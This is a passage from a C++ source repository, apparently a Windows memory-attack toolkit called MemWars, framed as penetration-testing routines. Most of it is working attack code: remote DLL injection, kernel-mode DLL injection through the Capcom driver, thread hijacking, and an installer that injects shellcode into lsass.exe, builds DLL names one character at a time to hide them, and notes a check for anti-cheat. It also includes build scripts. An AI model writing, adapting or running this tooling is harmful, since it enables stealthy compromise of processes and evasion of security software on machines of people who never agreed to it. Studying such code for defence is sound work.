        }
    } else {

        INJECTION_DATA data;
        data.dllPath = this->dllPath;
        data.hProcess = this->hProcess;
        data.useShellcode = requireConfirmationFile ? FALSE : TRUE;
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartThreadedInjection, &data, 0, NULL);
        DWORD ret = WaitForSingleObject(hThread, this->timeout);

        if (ret == WAIT_TIMEOUT) {
            TerminateThread(hThread, 0);
            results += "[-] InjectDLL() failed. Injection timed out.\n";
            DeleteConfirmationFile();
            return FALSE;
        } else {
            GetExitCodeThread(hThread, &status);
        }
    }
    
    if (status != 0 && status != 10) {
        results += "[-] InjectDLL() failed. Could not inject DLL. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        if (status == 1) results += "[-] Could not run VirtualAllocEx() on target process.\n";
        if (status == 2) results += "[-] Could not run WriteProcessMemory() on target process.\n";
        if (status == 3) results += "[-] Could not retrieve module handle of kernel32.dll.\n";
        if (status == 4) results += "[-] Could not retrieve process address of LoadLibraryW or ExitThread.\n";
        if (status == 5) results += "[-] Could not run CreateRemoteThread() on target process.\n";
        if (status == 6) results += "[-] WaitForSingleObject() returned WAIT_FAILED.\n";
        if (status == 8) results += "[-] GetExitCodeThread() failed. Could not retrieve status of remote thread.\n";
        results += "[+] This indicates that ";
        results += this->processName;
        results += " is protected from DLL Injections.\n";
        return FALSE;
    }

    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "dllInjectionConfirmationFile");

    // in case we require a confirmation file, give the injected DLL time to create it
    if (status != 0) {
        for (int i = 0; i < 500; i++) {
            if (PathFileExists(tempPath)) {
                break;
            }
            Sleep(10);
        }
    }
    
    if (status == 0) {
        results += "[+] InjectDLL() was successful.\n[+] ";
        results += this->processName;
        results += " is vulnerable to DLL injections (confirmed by the return value of LoadLibrary).\n";

    } else if (status == 10 && !PathFileExists(tempPath)) {
        if (!requireConfirmationFile) {
            results += "[-] InjectDLL() failed. LoadLibrary returned NULL and confirmation file could not be found.\n";
            results += "[-] This indicates that ";
            results += this->processName;
            results += " is protected from DLL Injections.\n";

        } else {
            results += "[-] InjectDLL() failed. Confirmation file could not be found.\n";
        }
        
        return FALSE;

    } else {
        results += "[+] InjectDLL() was successful.\n[+] ";
        results += this->processName;
        results += " is vulnerable to DLL injections (confirmed by the confirmation file creation).\n";
    }
    
    if (PathFileExists(tempPath) && !DeleteFile(tempPath)) {
        results += "[-] Warning: confirmation file could not be deleted! Make sure to delete it before running further tests. The containing folder is:\n";
        results += tempPath;
        results += "\n";
    }
    return TRUE;
}


void DLLInjectionProvider::SetTimeout(int milliSeconds) {
    this->timeout = milliSeconds;
}

void DLLInjectionProvider::RequireConfirmationFile() {
    requireConfirmationFile = TRUE;
}

bool DLLInjectionProvider::AssertCompatible() {
    // would be nice to have (check if DLL and process share bit architecture)
    return TRUE;
}

DWORD StartThreadedInjection(LPVOID param) {
    INJECTION_DATA* data = (INJECTION_DATA*)param;
    if (data->useShellcode) {
        return LoadDll(data->hProcess, data->dllPath.c_str());
    } else {
        return LoadDllNoShellcode(data->hProcess, data->dllPath.c_str());
    }
}

bool DeleteConfirmationFile() {
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "dllInjectionConfirmationFile");
    return DeleteFile(tempPath);
}


// int main() {

//     DLLInjectionProvider a;
//     a.SetTargetProcessByName(L"explorer.exe");
//     a.SetTargetDLL(L"InjectedDLL.dll");
//     a.ExecuteAttack();

//     cout << a.GetAttackResults() << endl;

// }
```

`PenetrationRoutines/DLLInjectionProvider/DLLInjectionProvider.h`:

```h
#include <string>
#include <Windows.h>
#include "../AttackProvider/AttackProvider.h"
#include "../../AttackServices/DLLInjectionAttack/Injector.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

struct INJECTION_DATA {
    wstring dllPath;
    HANDLE hProcess;
    BOOL useShellcode;
};

DWORD StartThreadedInjection(LPVOID param);
bool DeleteConfirmationFile();

class DLLInjectionProvider : public AttackProvider {
public:
    DLLInjectionProvider(){}
    bool SetTargetProcessByName(const string);
    bool SetTargetDLL(const string);
    void RequireConfirmationFile();
    void SetTimeout(int milliSeconds);
    bool InjectDLL();
    bool AssertCompatible(); // possible addition
    
protected:
    int timeout = 0;
    wstring dllPath = L"";
    HANDLE hProcess = NULL;
    string processName = "";
    bool requireConfirmationFile = FALSE;
};

```

`PenetrationRoutines/DLLInjectionProvider/buildDLLInjectionProvider.bat`:

```bat
@ECHO OFF
cl.exe /EHsc DLLInjectionProvider.cpp ../../AttackServices/DLLInjectionAttack/Injector.cpp ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib Shlwapi.lib
```

`PenetrationRoutines/KernelDLLInjectionProvider/KernelDLLInjectionProvider.cpp`:

```cpp
#include <string>
#include "KernelDLLInjectionProvider.h"
#include "../AttackProvider/AttackProvider.h"
#include "../../AttackServices/HiddenKernelDLLInjectionAttack/Injector.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;


int main() {
    KernelDLLInjectionProvider ki;
    ki.SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/DLLInjectionAttack/InjectedDLL.dll");
    ki.LoadDLLIntoKernel();
    cout << ki.GetAttackResults();
    // start the target program
    ki.InjectDLLIntoTargetProcess("TestApp.exe");
    // ki.InjectDLL();
    cout << ki.GetAttackResults();
}
```

`PenetrationRoutines/KernelDLLInjectionProvider/KernelDLLInjectionProvider.h`:

```h
#pragma once
#include <string>
#include "../../AttackServices/HiddenKernelDLLInjectionAttack/Injector.h"
#include "../AttackProvider/AttackProvider.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

// this class and the attack are completely written inside header files since the attack relies on avoiding page faults
// it therefore locks memory and makes sure that no memory that is used by the capcom driver gets paged out
// using .cpp files counteracts this task
class KernelDLLInjectionProvider : public AttackProvider {
public:
    KernelDLLInjectionProvider(){}
    bool SetTargetDLL(const string _dllPath) {
        wstring dllPath(_dllPath.begin(), _dllPath.end());
        if (!PathFileExistsW(dllPath.c_str())) {
            results += "[-] SetTargetDLL() failed. File not found. System Error Code: ";
            results += to_string(GetLastError());
            results += "\n";
            return FALSE;
        }
        this->dllPath = _dllPath;
        return TRUE;
    }
    bool LoadDLLIntoKernel() {
        if (dllPath == "") {
            results += "[-] LoadDLLIntoKernel() failed. Could not inject DLL. DLL could not be found.\n";
            return FALSE;
        }
        int status = MapDLLIntoKernel(dllPath);
        if (status != 0) {
            results += "[-] InjectDLL() failed. Could not inject DLL. System Error Code: ";
            results += to_string(GetLastError());
            results += "\n";
            if (status == 1) results += "[-] Could not initialize Memory Controller. (Did you run as admin?)\n";
            if (status == 2) results += "[-] Could not get process address of TlsGetValue.\n";
            if (status == 3) results += "[-] Could not map DLL into the kernel.\n";
            return FALSE;
        }
        results += "[+] LoadDLLIntoKernel() was successful.\n[+] Injected ";
        results += this->dllPath;
        results += " into kernel memory space.\n";
        mappedDll = true;
        return TRUE;
    }

    bool InjectDLLIntoTargetProcess(string processName = "") {
        if (processName == "") {
            results += "[-] InjectDLLIntoProcess() failed. Set target process name.\n";
            return FALSE;
        }
        if (!mappedDll) {
            results += "[-] InjectDLLIntoProcess() failed. Map DLL into kernel first.\n";
            return FALSE;
        }

        int status = InjectDLLIntoProcess(processName);
        if (status != 0) {
            results += "[-] InjectDLL() failed. Could not inject DLL. System Error Code: ";
            results += to_string(GetLastError());
            results += "\n";
            if (status == 4) results += "[-] Could not find the target process.\n";
            if (status == 5) results += "[-] Could not find the EProcess of the target process.\n";
            if (status == 6) results += "[-] Could not find a fitting padspace inside the TlsGetValue function.\n";
            if (status == 7) results += "[-] The target process did not call the TlsGetValue function and the attack timed out. (If the target process crashed, run it as administrator.)\n";
            return FALSE;
        }
        Sleep(500); // give the DLL time for the file creation
        TCHAR tempPath[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        lstrcatA(tempPath, "dllInjectionConfirmationFile");
        if (!PathFileExists(tempPath)) {
            results += "[-] InjectDLL() failed. Confirmation file could not be found. This indicates that LoadLibrary() failed.\n";
            return FALSE;
        }
        results += "[+] InjectDLLIntoProcess() was successful.\n[+] ";
        results += processName;
        results += " is vulnerable to the Hidden Kernel DLL Injection Attack.\n";
        if (!DeleteFile(tempPath)) {
            results += "[-] Warning: confirmation file could not be deleted! Make sure to delete it before running further tests. The containing folder is:\n";
            results += tempPath;
            results += "\n";
        }
        return TRUE;
    }
    
    
protected:
    string dllPath = "";
    bool mappedDll = false;
};


```

`PenetrationRoutines/KernelDLLInjectionProvider/buildKernelDLLInjectionProvider.bat`:

```bat
@ECHO OFF
cl.exe /EHsc KernelDLLInjectionProvider.cpp ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib Shlwapi.lib
```

`PenetrationRoutines/LsassAttackProvider/Client/LsassAttackProvider.cpp`:

```cpp
#include <iostream>
#include <map>
#include <string>
#include <windows.h>
#include <sstream>

#include "LsassAttackProvider.h"
#include "../../../Core/MemWarsCore.h"
#include "../../../Core/MemWarsServicesCore.h"


using namespace std;

vector<BYTE> SPIAttackProvider::HexStringToBytes(string hexString) {
    vector<BYTE> bytes;
    for (unsigned int i = 0; i < hexString.length(); i += 2) {
        string byteString = hexString.substr(i, 2);
        char byte = (char) strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

string SPIAttackProvider::ReadProcessMemory(string s_address, int readSize) {
    uint64_t address = _strtoui64(s_address.c_str(), NULL, 16);
    void* readBuf = calloc(MAX_VAL_SIZE, 1);
    SIZE_T bytesRead;
    NTSTATUS status = smc.ReadVirtualMemory((void*)address, readBuf, readSize, &bytesRead);
    if (status != 0xFFFFFFFF) {
        results += "[+] lsass.exe called NtReadVirtualMemory() on ";
        results += this->targetProcess;
        results += ".\n";
        stringstream sstream;
        for (int i = 0; i < bytesRead; i++) {
            sstream << hex << (uint64_t)*((uint64_t*)readBuf + i);
        }
        return sstream.str();
    }
    results += "[-] ReadProcessMemory() call on ";
    results += this->targetProcess;
    results += " failed.\n";
    return "";
}
unsigned int SPIAttackProvider::WriteProcessMemory(string s_address, string hexSequence) {
    uint64_t address = _strtoui64(s_address.c_str(), NULL, 16);
    vector<BYTE> bytes = HexStringToBytes(hexSequence);
    SIZE_T bytesWritten = 0;
    // uint64_t val = *(uint64_t*)&bytes[0];
    // cout << "test " << hex << val << endl;
    NTSTATUS status = smc.WriteVirtualMemory((void*)address, (void*)&bytes[0], bytes.size(), &bytesWritten);
    if (status != 0xFFFFFFFF) {
        results += "[+] lsass.exe called NtWriteVirtualMemory() on ";
        results += this->targetProcess;
        results += ".\n";
        bytesWritten = bytesWritten == bytes.size() ? bytesWritten : 0;
        return bytesWritten;
    }
    results += "[-] WriteProcessMemory() call on ";
    results += this->targetProcess;
    results += " failed.\n";
    return 0;
}

bool SPIAttackProvider::Init(string _targetProcess/*, string _pivotProcess*/) {
    this->targetProcess = _targetProcess;
    // this->pivotProcess = pivotProcess;

    wstring targetProcess(_targetProcess.begin(), _targetProcess.end());
    wstring pivotProcess = L"lsass.exe";

    if (!smc.Init(pivotProcess)) {
        results += "[-] Init() failed. Could either not get PID of lsass.exe or connect to communication file mapping.\n";
        return FALSE;
    }
    if (!smc.SetTargetProcessHandle(targetProcess)) {
        results += "[-] Init() failed. HANDLE ID of ";
        results += _targetProcess;
        results += " inside lsass.exe not found.\n";
        results += "[-] Note that lsass.exe only has HANDLE IDs to processes that use socket functions.\n";
        results += "[-] You cannot use this attack method on all processes.\n";
        return FALSE;
    }
    return TRUE;
}

bool SPIAttackProvider::StartAttack() {
    if (this->targetProcess == "") {
        results += "[-] StartAttack() failed. Specify target process first with SetTargetProcessByName()\n";
        return FALSE;
    }
    wstring targetProcess(targetProcess.begin(), targetProcess.end());
    HANDLE hProcess = GetProcessHandleByName(targetProcess, PROCESS_QUERY_INFORMATION);
    if (hProcess == NULL) {
        results += "[-] StartAttack() failed. Could not retrieve the HANDLE of the process.\n";
        results += "[-] The automated penetration test failed but the Read/WriteProcessMemory-Functions might still work. Try to read custom memory offsets to ensure that the process is fully protected.\n";
        return FALSE;
    }
    
    const WCHAR* value = L"WINDOWS";
    size_t size = wcslen(value);
    MEMORY_BASIC_INFORMATION info;
    for (PBYTE p = NULL; VirtualQueryEx(hProcess, p, &info, sizeof(info)) != 0; p += info.RegionSize) {
        if (info.State == MEM_COMMIT) {
            UINT readSize = info.RegionSize > GetUsableSharedMemSize() ? GetUsableSharedMemSize() : info.RegionSize;
            readSize -= 5;
            BYTE* buf = (BYTE*)malloc(readSize);
            int lastIndex = 0;
            for (int i = 0; i < info.RegionSize; i += readSize) {
                if (i + size > info.RegionSize) {
                    // end of memory region reached
                    break;
                }
                SIZE_T sizeBuf;
                smc.ReadVirtualMemory(p + i, buf, readSize, &sizeBuf);
                for (int n = 0; n < readSize; n++) {
                    // cout << *(buf + n);
                    if (memcmp(buf + n, value, size) == 0) {
                        results += "[+] StartAttack() successfully read memory values of ";
                        results += this->targetProcess;
                        results += ".\n";
                        return TRUE;
                    }
                }
                lastIndex = i;
            }
            if (lastIndex < info.RegionSize) {
                SIZE_T sizeBuf;
                smc.ReadVirtualMemory(p + lastIndex, buf, info.RegionSize - lastIndex, &sizeBuf);
                for (int n = 0; n < info.RegionSize - lastIndex; n++) {
                    // cout << *(buf + n);
                    if (memcmp(buf + n, value, size) == 0) {
                        results += "[+] StartAttack() successfully read memory values of ";
                        results += this->targetProcess;
                        results += ".\n";
                        return TRUE;
                    }
                }
            }
            free(buf);
        }
    }
    results += "[-] StartAttack() failed. Could not read memory of ";
    results += this->targetProcess;
    results += ".\n";
    return FALSE;
}


// int main() {

    
    
//     size_t size = 0;
//     SPIAttackProvider spi;
//     if (!spi.Init("SkypeApp.exe")) {
//         cout << spi.GetAttackResults() << endl;
//         return 1;
//     }
//     size = spi.WriteProcessMemory("0x1c921120000", "BEEF");
//     cout << size << endl;
//     string a = spi.ReadProcessMemory("0x1c921120000", sizeof(int));
//     cout << a << " # " << hex << atoi(a.c_str()) << endl;
//     cout << spi.GetAttackResults() << endl;


//     HANDLE process = NULL;
//     while (process == NULL) {
//         process = (HANDLE)GetProcessByName("SkypeApp.exe");
//         if (process == NULL) {
//             cout << "Open Skype to start testing..." << endl;
//             Sleep(5000);
//         }
//     }

//     BYTEARRAY bArr = {0};
//     ReadProcessMemoryAtPtrLocation((void*)0x000000D0F2EFC553, sizeof(int), process, &bArr);

//     cout << hex << (int)bArr.values[0] << endl;
// }
```

`PenetrationRoutines/LsassAttackProvider/Client/LsassAttackProvider.h`:

```h
#pragma once;
#include <string>
#include <map>
#include <vector>
#include "../../../Core/MemWarsCore.h"
#include "../../../AttackServices/LsassAttack/StealthyMemManipulatorClient.h"
#include "../../../AttackServices/LsassAttack/StealthyMemManipulatorGetHandleId.h"
#include "../../AttackProvider/AttackProvider.h"

#define MAX_VAL_SIZE 255

class SPIAttackProvider : public AttackProvider {
public:
    SPIAttackProvider() {}
    bool Init(string targetProcess/*, string pivotProcess*/);
    string ReadProcessMemory(string address, int readSize);
    unsigned int WriteProcessMemory(string address, string hexSequence);
    int GetUsableSharedMemSize() {
        return smc.GetUsableSharedMemSize();
    }
    bool StartAttack();
protected:
    // wstring pivotProcess;
    string targetProcess = "";
    StealthyMemClient smc;
    vector<BYTE> HexStringToBytes(string hexString);
};


```

`PenetrationRoutines/LsassAttackProvider/Client/LsassAttackProviderTest.cpp`:

```cpp
#include "SPIAttackProvider.h"
#include "../../../Core/MemWarsCore.h"
#include "../../../Core/MemWarsServicesCore.h"
#include <iostream>
// #include <cstdlib>

using namespace std;

void ReadWriteValueTest() {
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessHandleByName(L"SkypeApp.exe");
        if (process == NULL) {
            cout << "Open Skype to start testing..." << endl;
            Sleep(5000);
        }
    }

    SPIAttackProvider ap;
    ap.Init(L"SkypeApp.exe", L"lsass.exe");

    BYTEARRAY bArr;
    IntToByteArray(&bArr, 1337);
    MEMPTRS testPtrs = {0};
    FindValueInProcess(&bArr, process, &testPtrs);

    if (testPtrs.size <= 0) {
        cout << "ReadWriteValueTest() failed. Test Value not found" << endl;
        return;
    }

    int readBuf;
    ap.ReadProcessMemory(testPtrs.memPointerArray[0], &readBuf, sizeof(int));

    if (readBuf != 1337) {
        cout << "ReadWriteValueTest() failed. ReadProcessMemory returns wrong value." << endl;
        return;
    }

    int writeBuf = 7331;
    ap.WriteProcessMemory(testPtrs.memPointerArray[0], &writeBuf, sizeof(int));
    ap.ReadProcessMemory(testPtrs.memPointerArray[0], &readBuf, sizeof(int));

    if (readBuf != 7331) {
        cout << "ReadWriteValueTest() failed. WriteProcessMemory did not write." << endl;
        return;
    }

    cout << "ReadWriteValueTest() success" << endl;
    
}

int main () {
    ReadWriteValueTest();
}
```

`PenetrationRoutines/LsassAttackProvider/Client/buildClient.bat`:

```bat
@ECHO OFF
cl.exe /EHsc LsassAttackProvider.cpp ../../../AttackServices/LsassAttack/StealthyMemManipulatorClient.cpp ../../../AttackServices/LsassAttack/StealthyMemManipulatorGetHandleId.cpp ../../../Core/MemWarsServicesCore.cpp ../../../Core/MemWarsCore.c ../../../AttackServices/LsassAttack/spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`PenetrationRoutines/LsassAttackProvider/Client/buildClientTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc SPIAttackProviderTest.cpp SPIAttackProvider.cpp ../../../AttackServices/LsassAttack/StealthyMemManipulatorClient.cpp ../../../AttackServices/LsassAttack/StealthyMemManipulatorGetHandleId.cpp ../../../Core/MemWarsServicesCore.cpp ../../../Core/MemWarsCore.c ../../../AttackServices/LsassAttack/spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`PenetrationRoutines/LsassAttackProvider/Installer/LsassInstallProvider.cpp`:

```cpp
#include "LsassInstallProvider.h"
#include <iostream>

using namespace std;

void SPIInstallProvider::Init() {
    wstring we = L"";
    samsrvDll = we+L's'+L'a'+L'm'+L's'+L'r'+L'v'+L'.'+L'd'+L'l'+L'l';
    msvcrtDll = we+L'm'+L's'+L'v'+L'c'+L'r'+L't'+L'.'+L'd'+L'l'+L'l';
    crypt32Dll = we+L'c'+L'r'+L'y'+L'p'+L't'+L'3'+L'2'+L'.'+L'd'+L'l'+L'l';
    lsassExe = we+L'l'+L's'+L'a'+L's'+L's'+L'.'+L'e'+L'x'+L'e';
}

bool SPIInstallProvider::Install() {
    this->Init();

    StealthyMemInstaller smi;
    vector<wstring> preferedThreadModuleNames;
    preferedThreadModuleNames.push_back(this->samsrvDll);
    preferedThreadModuleNames.push_back(this->msvcrtDll);
    preferedThreadModuleNames.push_back(this->crypt32Dll);
    if (!smi.Init(preferedThreadModuleNames, this->lsassExe)) {
        return FALSE;
    }

    int status = smi.Install();
    if (status != 0) {
        results += "[-] Install() failed. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        if (status == 1) results += "[-] An installing routine is already running.\n";
        if (status == 2) results += "[-] Could not set process privilege to SE_DEBUG_NAME.\n";
        if (status == 3) results += "[-] Could not retrieve target process PID.\n";
        if (status == 4) results += "[-] Could not retrieve target process HANDLE.\n";
        if (status == 5) results += "[-] Could not find usable executable memory in target process.\n";
        if (status == 6) results += "[-] Could not get a usable TID.\n";
        if (status == 7) results += "[-] Could not create a shareable file mapping.\n";
        if (status == 8) results += "[-] Gatekeeper process (explorer.exe) could not get a HANDLE to the file mapping.\n";
        if (status == 9) results += "[-] Could not inject file mapping shellcode into lsass.exe.\n";
        if (status == 10) results += "[-] Could not inject communication shellcode into lsass.exe.\n";
        results += "[-] Hint: The process needs to be run as administrator.\n";
        return FALSE;
    }
    results += "[+] Successfully installed the lsass.exe attack\n";

    // TODO Assert no anti-cheat running

    return TRUE;
}

// int main() {
//     SPIInstallProvider inst;
//     inst.Install();
// }
```

`PenetrationRoutines/LsassAttackProvider/Installer/LsassInstallProvider.h`:

```h
#include "../../../AttackServices/LsassAttack/StealthyMemManipulatorInstaller.h"
#include "../../AttackProvider/AttackProvider.h"
#include <string>

using namespace std;

class SPIInstallProvider : public AttackProvider {
public:
    bool Install();
protected:
    void Init();
    wstring samsrvDll;
    wstring msvcrtDll;
    wstring crypt32Dll;
    wstring lsassExe;
};
```

`PenetrationRoutines/LsassAttackProvider/Installer/buildInstaller.bat`:

```bat
@ECHO OFF
cl.exe /EHsc SPIInstallProvider.cpp ../../../Core/MemWarsServicesCore.cpp ../../../AttackServices/LsassAttack/StealthyMemManipulatorInstaller.cpp ../../../Core/MemWarsCore.c ../../../AttackServices/LsassAttack/spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`PenetrationRoutines/ThreadHijackProvider/ThreadHijackProvider.cpp`:

```cpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <Shlwapi.h>
#include "ThreadHijackProvider.h"


bool ThreadHijackProvider::SetTargetProcessByName(const string _name) {
    wstring name(_name.begin(), _name.end());
    this->processNameW = name;
    this->processName = _name;
    hProcess = GetProcessHandleByName(name);
    if (hProcess == NULL) {
        results += "[-] SetTargetProcessByName() failed. Could not get HANDLE to ";
        results += this->processName;
        results += ". System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    return TRUE;
}

bool ThreadHijackProvider::HijackThread() {
    DeleteHijackConfirmationFile();
    if (hProcess == NULL) {
        results += "[-] HijackThread() failed. Process HANDLE is NULL.\n";
        return FALSE;
    }

    vector<DWORD> pids = GetPIDsOfProcess(this->processNameW);
    if (pids.empty()) {
        results += "[-] HijackThread() failed. Could not get PIDs of ";
        results += this->processName;
        results += ". System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    DWORD pid = pids[0];
    vector<DWORD> tids = GetTIDChronologically(pid);
    if (tids.empty()) {
        results += "[-] HijackThread() failed. Could not get TIDs of ";
        results += this->processName;
        results += ". System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }

    DWORD tid = tids[0];

    DWORD status;
    if (this->timeout <= 0) {
        status = ThreadHijack(hProcess, tid);
    } else {

        HIJACK_DATA data;
        data.hProcess = hProcess;
        data.tid = tid;
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartThreadedHijack, &data, 0, NULL);
        DWORD ret = WaitForSingleObject(hThread, this->timeout);

        if (ret == WAIT_TIMEOUT) {
            TerminateThread(hThread, 0);
            results += "[-] ThreadHijack() failed. Attack timed out.\n";
            DeleteHijackConfirmationFile();
            return FALSE;
        } else {
            GetExitCodeThread(hThread, &status);
        }
    }

    
    if (status != 0) {
        results += "[-] ThreadHijack() failed. Could not hijack thread. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        if (status == 1) results += "[-] Could not get process address of CreateFileA.\n";
        if (status == 2) results += "[-] Could call VirtualAllocEx() on target process.\n";
        if (status == 3) results += "[-] Could call OpenThread() on target process.\n";
        if (status == 4) results += "[-] Could not call SuspendThread() on target thread\n";
        if (status == 5) results += "[-] Could not call GetThreadContext() on target thread.\n";
        if (status == 6) results += "[-] Could not call SetThreadContext() on target thread.\n";
        if (status == 7) results += "[-] Could not call ResumeThread() on target thread.\n";
        results += "[+] This indicates that ";
        results += this->processName;
        results += " is protected from Thread hijacking.\n";
        return FALSE;
    }

    // TCHAR processPath[MAX_PATH];
    // GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH);
    // memset(processPath + strlen(processPath) - strlen(this->processName.c_str()), 0, MAX_PATH - strlen(processPath));
    // lstrcatA(processPath, "hijackConfirmationFile");

    TCHAR filename[MAX_PATH];
    GetTempPath(MAX_PATH, filename);
    lstrcatA(filename, "hijackConfirmationFile");

    if (!PathFileExists(filename)) {
        results += "[-] HijackThread() failed because the confirmation file could not be found.\n";
        results += "[-] If " ;
        results += this->processName;
        results += " crashed it might be because the injected shellcode (x64) is not compatible with the bit architecture.\n";
        return FALSE;
    }
    results += "[+] HijackThread() was successful.\n[+] ";
    results += this->processName;
    results += " is vulnerable to thread hijacking.\n";
    if (!DeleteFile(filename)) {
        results += "[-] Warning: confirmation file could not be deleted! Make sure to delete it before running further tests. The containing folder is:\n";
        results += filename;
        results += "\n";
    }
    return TRUE;
}

void ThreadHijackProvider::SetTimeout(int milliSeconds) {
    this->timeout = milliSeconds;
}

DWORD StartThreadedHijack(LPVOID param) {
    HIJACK_DATA* data = (HIJACK_DATA*)param;
    return ThreadHijack(data->hProcess, data->tid);
}

bool DeleteHijackConfirmationFile() {
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "hijackConfirmationFile");
    return DeleteFile(tempPath);
}


// int main() {

//     ThreadHijackProvider a;
//     a.SetTargetProcessByName("memoryTestApp.exe");
//     a.HijackThread();

//     cout << a.GetAttackResults() << endl;
// }
```

`PenetrationRoutines/ThreadHijackProvider/ThreadHijackProvider.h`:

```h
#include <string>
#include "../AttackProvider/AttackProvider.h"
#include "../../AttackServices/ThreadHijackAttack/ThreadHijack.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

struct HIJACK_DATA {
    HANDLE hProcess;
    DWORD tid;
};

bool DeleteHijackConfirmationFile();
DWORD StartThreadedHijack(LPVOID param);

class ThreadHijackProvider : public AttackProvider {
public:
    ThreadHijackProvider(){}
    bool SetTargetProcessByName(const string);
    void SetTimeout(int milliSeconds);
    bool HijackThread();
    
protected:
    int timeout = 0;
    HANDLE hProcess = NULL;
    wstring processNameW = L"";
    string processName = "";
};
```

`PenetrationRoutines/ThreadHijackProvider/buildThreadHijackProvider.bat`:

```bat
@ECHO OFF
cl.exe /EHsc ThreadHijackProvider.cpp ../../AttackServices/ThreadHijackAttack/ThreadHijack.cpp ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib Shlwapi.lib
```

`PenetrationRoutines/ValueFinder/ValueFinder.cpp`:

```cpp
#include <iostream>
#include <algorithm>
#include <fstream>
#include <map>
#include "ValueFinder.h"

using namespace std;

BOOL ValueFinder::Init(string attackMethod, wstring targetProcess, wstring pivotProcess) {
    this->attackMethod = attackMethod;
    this->targetProcess = targetProcess;
    this->pivotProcess = pivotProcess;

    hProcess = GetProcessHandleByName(targetProcess, PROCESS_QUERY_INFORMATION);
    if (!hProcess) {
        return FALSE;
    }

    if (attackMethod == "SPI") {
        SPIAttackProvider* spi = new SPIAttackProvider;
        if (!spi->Init(targetProcess, pivotProcess)) {
            return FALSE;
        }
        attackProvider = spi;
    } else {
        return FALSE;
    }

    return TRUE;
}


vector<void*> ValueFinder::FindValueUsingVirtualQuery(void* value, const SIZE_T size, HANDLE hProcess) {
    vector<void*> ptrs;
    if (size > MAX_VAL_SIZE) {
        cout << "Val too big" << endl;
        return ptrs;
    }
    if (hProcess != NULL) {
        this->hProcess = hProcess;
    }
    MEMORY_BASIC_INFORMATION info;
    for (PBYTE p = NULL; VirtualQueryEx(this->hProcess, p, &info, sizeof(info)) != 0; p += info.RegionSize) {
        if (info.State == MEM_COMMIT) {
            PBYTE buf = (PBYTE)malloc(info.RegionSize);
            SIZE_T bytesRead;
            if (attackProvider->ReadProcessMemory(this->hProcess, p, buf, info.RegionSize, &bytesRead)) {
                for (int i = 0; i < bytesRead; i++) {
                    if (i + size >= bytesRead) {
                        break;
                    }
                    if (memcmp(buf + i, value, size) == 0) {
                        ptrs.push_back((void*)((DWORD64)p + i));
                    }
                }
            }
            free(buf);
        }
    }
    return ptrs;
}

void ValueFinder::RemoveNotMatchingValues(vector<void*>& memPtrs, void* value, SIZE_T size) {

    vector<void*>::iterator it = memPtrs.begin();
    for (; it != memPtrs.end();) {
        PBYTE buf = (PBYTE)malloc(size);
        SIZE_T bytesRead;
        if (attackProvider->ReadProcessMemory(this->hProcess, *it, buf, size, &bytesRead)) {
            if (memcmp(buf, value, size) != 0) {
                it = memPtrs.erase(it);
            } else {
                ++it;
            }
        }
        free(buf);
    }
}

map<void*, SIZE_T> ValueFinder::CreateMemoryMapUsingVirtualQuery(HANDLE hProcess) {
    map<void*, SIZE_T> memoryMetaData;
    if (hProcess != NULL) {
        this->hProcess = hProcess;
    }
    ofstream memFile("memoryMap", ios::binary);
    MEMORY_BASIC_INFORMATION info;
    for (PBYTE p = NULL; VirtualQueryEx(this->hProcess, p, &info, sizeof(info)) != 0; p += info.RegionSize) {
        if (info.State == MEM_COMMIT) {
            PBYTE buf = (PBYTE)malloc(info.RegionSize);
            SIZE_T bytesRead;
            if (attackProvider->ReadProcessMemory(this->hProcess, p, buf, info.RegionSize, &bytesRead)) {
                memoryMetaData[p] = bytesRead;
                memFile.write((const char*)buf, bytesRead);
            }
            free(buf);
        }
    }
    memFile.close();
    return memoryMetaData;
}

void ValueFinder::FilterMemoryMap(map<void*, SIZE_T>& memoryMapMetaData, int filterType) {
    ofstream newMemFile("memoryMapBuf", ios::binary);
    for (map<void*, SIZE_T>::iterator i = memoryMapMetaData.begin(); i != memoryMapMetaData.end();) {

        PBYTE buf = (PBYTE)malloc(i->second);
        SIZE_T bytesRead;
        attackProvider->ReadProcessMemory(this->hProcess, i->first, buf, i->second, &bytesRead);
        

        

    }
}



/*
map<uintptr_t, BYTE> Client::GetMemoryMap(uintptr_t startAddress = 0, uintptr_t endAddress = 0) {
    map<uintptr_t, BYTE> memoryMap;
    for (uintptr_t i = startAddress; i < endAddress; i++) {
        SIZE_T sizeBuf;
        int buf;
